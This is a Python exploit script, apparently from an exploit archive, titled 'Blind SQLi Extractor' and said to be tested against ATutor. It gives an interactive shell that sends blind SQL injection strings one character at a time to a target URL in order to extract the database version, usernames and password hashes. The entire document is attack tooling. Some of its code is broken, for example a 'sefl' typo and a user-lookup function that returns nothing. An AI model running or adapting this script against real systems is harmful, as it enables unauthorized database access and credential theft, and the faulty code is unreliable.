# Exploit Title: Blind SQLi Extractor
# Date: 2021-04-05
# Exploit Author: Youssef B
# Tested against: ATutor until 2017

import sys, re, requests, cmd

ip, uri = sys.argv[1], sys.argv[2]

class colorterm:
    ENDC = '\033[0m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

class sqli_prompt(cmd.Cmd):
    intro = '\nWelcome to the sqlifinder shell. Type help or ? to list commands.\n'
    prompt = '(sqlifinder) '

    def do_db_version(self, arg):
        db_version()
    
    def do_db_creds(self, arg):
        db_creds()
    
    def do_db_current_user(sefl, arg):
        db_get_user()

    def do_db_get_users(self, arg):
        db_get_user()
    
    def do_quit(self, arg):
        exit(0)


def search_blind_sqli(ip, uri, inj_str):
    for i in range(32, 126):
        repl    = inj_str.replace("[CHAR]", str(i))
        target  = uri %(ip, repl)
        r       = requests.get(target)
        
        content_length = int(r.headers['Content-Length'])

        if (content_length > 20):
            return i

    return None

def db_extractor(r, ip, uri, qr_inj):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" %(qr_inj,i)
        search_blind = search_blind_sqli(ip, uri, injection_string)

        try:
            extracted += chr(search_blind)
            extracted_char = chr(search_blind)
            sys.stdout.write(colorterm.GREEN + extracted_char)
            sys.stdout.flush()
        except:
            break

    if extracted_char is not None:
        print(colorterm.ENDC + "\n(+) done!")
        print(colorterm.WARNING + "(+) You've found something interesting!\n" + colorterm.ENDC)
    else:
        print(colorterm.ENDC + "\n(+) Unfortunately, nothing found...")
    
    return extracted

def db_version():
    print("(+) Retrieving database version...")
    injection_string = input("Enter your db query payload: ")
    db_extractor(20, ip, uri, injection_string)

def db_creds():
    username = db_get_user()
    
    print("(+) Retrieving password hash....")
    injection_pass = input("Enter your password query payload: ")
    password = db_extractor(50, ip, uri, injection_pass)

    print("(+) Credentials: " + colorterm.GREEN + username + colorterm.ENDC + " / " + colorterm.GREEN + password + colorterm.ENDC)

def db_get_user():
    print("(+) Retrieving username....")
    injection_string = input("Enter your username query payload: ")
    db_extractor(100, ip, uri, injection_string)


def main():
    if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <target> <uri>")
        print(f"(+) eg: {sys.argv[0]} 192.168.150.103 \"http://%s/test/?q=%s\"")
        sys.exit(-1)
    
    sqli_prompt().cmdloop()


if __name__ == "__main__":
    main()
